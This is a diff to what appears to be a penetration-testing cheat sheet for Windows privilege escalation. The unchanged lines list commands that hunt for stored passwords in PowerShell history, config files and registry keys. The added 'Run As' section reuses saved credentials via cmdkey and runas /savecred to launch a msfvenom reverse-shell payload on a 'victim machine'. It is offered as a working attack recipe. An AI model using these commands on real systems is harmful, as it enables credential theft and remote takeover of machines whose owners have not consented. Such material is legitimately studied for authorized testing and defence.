@@ -27,7 +27,6 @@ powershell Find-DomainShare -ComputerDomain domain.local
 
 <h3>Find passwords</h3> <br>
 Powershell cred history - cat (Get-PSReadlineOption).HistorySavePath | sls passw <br>
-cmdkey /list (need to the use windows tool - runas.exe google the syntax to see how to run this.<br>
 cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
 findstr /si password *.xml *.ini *.txt *.config
 findstr /spin "password" *.*
@@ -51,6 +50,13 @@ reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
 
 reg query HKLM /f password /t REG_SZ /s
 reg query HKCU /f password /t REG_SZ /s
+<br>
+
+<h2> Run As </h2> <br>
+On CMD type <br>
+cmdkey /list (look for any saved creds listed and download tool runas <br>
+Create reverse shell msfvenom payload and move to victim machine, start listener <br>
+runas /savecred /user:adduser  C:\path\to\msfvenomshell <br>
 
 <h3>Passwords in unattend.xml</h3>
 Location of the unattend.xml files.
